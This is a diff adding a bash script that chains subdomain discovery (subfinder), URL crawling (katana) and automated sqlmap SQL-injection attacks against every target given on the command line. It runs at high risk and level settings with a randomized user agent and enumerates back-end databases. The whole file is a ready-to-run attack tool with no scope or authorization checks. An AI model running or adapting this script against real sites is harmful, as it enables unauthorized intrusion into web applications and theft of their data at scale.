@@ -1,0 +1,74 @@
+#!/bin/bash
+
+checkRequirements() {
+
+	requirements=( 'subfinder' 'sqlmap' 'katana' 'curl' )
+
+	for requirement in "${requirements[@]}"; do
+
+		if ! command -v "$requirement" > /dev/null; then
+
+			echo "$requirement not found!"
+			exit 1
+
+		fi
+
+	done
+
+}
+
+checkIsUp() {
+
+	echo "Testing if $target is up..."
+	if ! curl "$target" ; then
+
+		echo "$target seems down, skipping..."
+		return 1
+
+	fi
+
+}
+
+testTarget() {
+
+		echo "Searching for subdomain on $target..."
+		found_domains=( $( subfinder -d "$target" -all -silent ) )
+
+		for domain in "${found_domains[@]}"; do
+
+			echo "Searching for url on $domain..."
+			found_urls=( $( katana -aff -jc -kf -fx -retry 3 -u "$domain" -silent ) )
+
+			for url in "${found_urls[@]}"; do
+
+				echo "Searching for SQLi on $url..."
+
+				if echo "$url" | grep -E '=|\?'; then
+
+					sqlmap -u "$url" --batch --dbs --risk 2 --level 5 --random-agent
+
+				else
+
+					sqlmap -u "$url" --batch --dbs --risk 2 --level 5 --random-agent --forms
+
+				fi
+
+			done
+
+		done
+
+}
+
+checkRequirements
+
+targets=( "$@" )
+
+for target in "${targets[@]}"; do
+
+	if checkIsUp; then
+
+		testTarget
+
+	fi
+
+done
